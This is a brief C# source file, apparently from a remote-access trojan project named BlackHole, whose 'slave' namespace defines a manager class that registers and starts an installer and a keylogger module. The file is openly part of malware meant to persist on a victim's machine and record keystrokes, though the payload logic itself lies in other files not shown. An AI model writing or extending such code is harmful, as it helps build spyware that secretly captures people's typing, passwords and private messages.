using BlackHole.Common;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Slave.Malicious
{
    public sealed class MaliciousManager : Singleton<MaliciousManager>
    {
        private List<IMalicious> m_malicious;

        public MaliciousManager()
        {
            m_malicious = new List<IMalicious>()
            {
                Installer.Instance,
                Keylogger.Instance
            };
        }

        public void Initialize()
        {
            m_malicious.ForEach(malicious => malicious.Initialize());
        }
    }
}
